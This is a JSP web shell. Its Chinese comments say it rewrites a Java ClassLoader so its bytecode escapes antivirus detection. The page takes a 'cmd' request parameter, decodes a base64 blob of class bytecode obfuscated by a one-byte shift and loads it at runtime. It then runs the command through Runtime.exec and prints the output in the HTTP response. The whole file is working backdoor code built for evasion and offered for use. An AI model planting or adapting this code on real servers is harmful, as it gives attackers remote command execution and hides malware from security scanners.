<%--<%@ page import="java.util.Base64" %>--%>
<%@ page import="sun.misc.BASE64Decoder" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="java.io.IOException" %>
<%@ page pageEncoding="UTF-8" language="java" %>
<%

    /**
     * author by guowei
     * 重写Classloader，利用字节码免杀
     * 对要上传的服务器使用的jdk驱动有要求，下面的恶意类class要和服务器jdk版本一致，向下兼容不向上兼容，如服务器jdk7，class文件为jdk8编译生成，这样不行
     */
    String cmd =request.getParameter("cmd");
    ClassLoader classLoader = new ClassLoader() {
        @Override
        public Class<?> loadClass(String name) throws ClassNotFoundException {
            if (name.contains("Evalforbytes")) {
                return findClass(name);
            } else {
                return super.loadClass(name);
            }
        }
        @Override
        protected Class<?> findClass(String name) throws ClassNotFoundException{
//            ClassNotFoundExceptionbyte [] bytes = Base64.getDecoder().decode("yv66vgAAADQAUQoAEQAvBwAwCgACAC8KADEAMgoAMQAzBwA0BwA1CgA2ADcKAAcAOAoABgA5CgAGADoKAAIAOwgAPAoAAgA9CQAQAD4HAD8HAEABAAJhcwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEABjxpbml0PgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAcTE15Y2xhc3Nsb2FkZXIvRXZhbGZvcmJ5dGVzOwEAA2NtZAEADXN0cmluZ0J1aWxkZXIBABlMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAHcHJvY2VzcwEAE0xqYXZhL2xhbmcvUHJvY2VzczsBAAJicgEAGExqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEAAWEBAA1TdGFja01hcFRhYmxlBwA/BwBBBwAwBwBCBwA0AQAKRXhjZXB0aW9ucwcAQwEACHRvU3RyaW5nAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAApTb3VyY2VGaWxlAQARRXZhbGZvcmJ5dGVzLmphdmEMABQARAEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyBwBFDABGAEcMAEgASQEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIBABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyBwBCDABKAEsMABQATAwAFABNDABOACwMAE8AUAEAAQoMACsALAwAEgATAQAaTXljbGFzc2xvYWRlci9FdmFsZm9yYnl0ZXMBABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N0cmluZwEAEWphdmEvbGFuZy9Qcm9jZXNzAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAAygpVgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQATKExqYXZhL2lvL1JlYWRlcjspVgEACHJlYWRMaW5lAQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7ACEAEAARAAAAAQABABIAEwAAAAIAAQAUABUAAgAWAAAA5wAFAAYAAABLKrcAAbsAAlm3AANNuAAEK7YABU67AAZZuwAHWS22AAi3AAm3AAo6BBkEtgALWToFxgASLBkFtgAMEg22AAxXp//pKiy2AA61AA+xAAAAAwAXAAAAIgAIAAAACgAEAAsADAAMABQADQAoAA8AMwAQAEIAEgBKABUAGAAAAD4ABgAAAEsAGQAaAAAAAABLABsAEwABAAwAPwAcAB0AAgAUADcAHgAfAAMAKAAjACAAIQAEADAAGwAiABMABQAjAAAAHgAC/wAoAAUHACQHACUHACYHACcHACgAAPwAGQcAJQApAAAABAABACoAAQArACwAAQAWAAAALwABAAEAAAAFKrQAD7AAAAACABcAAAAGAAEAAAAZABgAAAAMAAEAAAAFABkAGgAAAAEALQAAAAIALg==");
            try {
                BASE64Decoder decoder = new BASE64Decoder();
//                下面这一段是恶意类的字节码的base64编码
                byte[] bytes = decoder.decodeBuffer("yf25vf///zP/UAn/EP8uBv8vCf8B/y4J/zD/MQn/MP8yBv8zBv80Cf81/zYJ/wb/Nwn/Bf84Cf8F/zkJ/wH/Ogf/Own/Af88CP8P/z0G/z4G/z8A/wFgcgD/EUtpYHVgLmtgbWYuUnNxaG1mOgD/BTtobWhzPQD/FCdLaWB1YC5rYG1mLlJzcWhtZjooVQD/A0JuY2QA/w5LaG1kTXRsYWRxU2Bha2QA/xFLbmJga1VgcWhgYWtkU2Bha2QA/wNzZ2hyAP8bS0x4YmtgcnJrbmBjZHEuRHVga2VucWF4c2RyOgD/AmJsYwD/DHJzcWhtZkF0aGtjZHEA/xhLaWB1YC5rYG1mLlJzcWhtZkF0aGtjZHE6AP8Gb3FuYmRycgD/EktpYHVgLmtgbWYuT3FuYmRycjoA/wFhcQD/F0tpYHVgLmhuLkF0ZWVkcWRjUWRgY2RxOgD/AGAA/wxSc2Biakxgb1NgYWtkBv8+Bv9ABv8vBv9BBv8zAP8JRHdiZG9zaG5tcgb/QgD/B3NuUnNxaG1mAP8TJyhLaWB1YC5rYG1mLlJzcWhtZjoA/wlSbnRxYmRFaGtkAP8QRHVga2VucWF4c2RyLWlgdWAL/xP/QwD/FmlgdWAua2BtZi5Sc3FobWZBdGhrY2RxBv9EC/9F/0YL/0f/SAD/FWlgdWAuaG4uQXRlZWRxZGNRZGBjZHEA/xhpYHVgLmhuLkhtb3RzUnNxZGBsUWRgY2RxBv9BC/9J/0oL/xP/Swv/E/9MC/9N/ysL/07/TwD/AAkL/yr/Kwv/Ef8SAP8ZTHhia2BycmtuYGNkcS5EdWBrZW5xYXhzZHIA/w9pYHVgLmtgbWYuTmFpZGJzAP8PaWB1YC5rYG1mLlJzcWhtZgD/EGlgdWAua2BtZi5PcW5iZHJyAP8SaWB1YC5rYG1mLkR3YmRvc2hubQD/AicoVQD/EGlgdWAua2BtZi5RdG1zaGxkAP8JZmRzUXRtc2hsZAD/FCcoS2lgdWAua2BtZi5RdG1zaGxkOgD/A2R3ZGIA/yYnS2lgdWAua2BtZi5Sc3FobWY6KEtpYHVgLmtgbWYuT3FuYmRycjoA/w1mZHNIbW90c1JzcWRgbAD/FicoS2lgdWAuaG4uSG1vdHNSc3FkYGw6AP8XJ0tpYHVgLmhuLkhtb3RzUnNxZGBsOihVAP8SJ0tpYHVgLmhuLlFkYGNkcTooVQD/B3FkYGNLaG1kAP8FYG9vZG1jAP8sJ0tpYHVgLmtgbWYuUnNxaG1mOihLaWB1YC5rYG1mLlJzcWhtZkF0aGtjZHE6/yD/D/8Q////AP8A/xH/Ev///wH/AP8T/xT/Af8V////5v8E/wX///9KKbb/ALr/AVi2/wJMt/8DKrX/BE26/wVYuv8GWCy1/we2/wi2/wk5AxgDtf8KWDkExf8RKxgEtf8LEQy1/wtWpv7oKSu1/w20/w6w////Av8W////If8H////Cf8D/wr/C/8L/xP/DP8n/w7/Mv8P/0H/Ef9J/xT/F////z3/Bf///0r/GP8Z//////9K/xr/Ev8A/wv/Pv8b/xz/Af8T/zb/Hf8e/wL/J/8i/x//IP8D/y//Gv8h/xL/BP8i////Hf8B/v8n/wQG/yMG/yQG/yUG/yYG/yf///v/GAb/JP8o////A/8A/yn/AP8q/yv/AP8V////Lv8A/wD///8EKbP/Dq////8B/xb///8F/wD///8Y/xf///8L/wD///8E/xj/Gf///wD/LP///wH/LQ==");
                //字节码内容解密
                for(int i=0 ; i<bytes.length;i++)
                {
                    bytes[i]=(byte)(bytes[i]+1);
                }
//                System.out.println(bytes);
                return  defineClass(name,bytes,0,bytes.length);
            } catch (IOException e) {
                e.printStackTrace();
            }
            return super.findClass(name);


        }
    };
    Class<?> cl =classLoader.loadClass("Myclassloader.Evalforbytes");
    Constructor cos = cl.getConstructor(String.class);
    Object obj = cos.newInstance(cmd);
    response.getWriter().print("<pre>");
    response.getWriter().print(obj.toString());
    response.getWriter().print("</pre>");
%>